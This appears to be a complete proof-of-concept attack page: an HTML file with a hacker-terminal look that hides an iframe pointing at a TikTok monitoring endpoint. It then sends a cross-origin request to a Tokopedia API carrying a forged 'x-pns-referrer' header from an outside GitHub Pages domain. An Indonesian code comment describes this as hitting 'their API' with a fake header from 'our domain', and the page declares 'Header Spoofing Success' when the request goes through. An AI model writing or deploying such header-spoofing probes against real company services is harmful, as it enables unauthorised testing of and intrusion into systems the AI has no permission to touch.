<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Critical Security Verificationn</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
        .terminal { border: 2px solid #0f0; display: inline-block; padding: 40px; box-shadow: 0 0 20px #0f0; background: #050505; }
        .blink { animation: blinker 1.2s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
        #log { font-size: 13px; color: #aaa; text-align: left; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
    </style>
</head>
<body>

    <div class="terminal">
        <h1 id="status">[ STATUS: INITIALIZING ]</h1>
        <p id="sub-status" class="blink">Targeting Web-Cookie Privacy Endpoint...</p>
        <div id="log"></div>
    </div>

    <iframe id="pwn_gate" 
            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
            style="display:none;"></iframe>

    <script>
    // Langsung tembak API mereka dengan header palsu dari domain kita
    fetch("https://shop-id.tokopedia.com/api/v1/web-cookie-privacy/config?locale=en&appId=1988", {
        method: "GET",
        mode: "cors", // Ini akan memicu CORS check
        headers: {
            "x-pns-referrer": "https://fadhlur21.github.io/pwned"
        }
    }).then(res => {
        if(res.ok) {
            document.body.innerHTML = "<h1>CRITICAL: Header Spoofing Success!</h1><p>Server accepted forged x-pns-referrer from GitHub Origin.</p>";
        }
    });
</script>

</body>
</html>
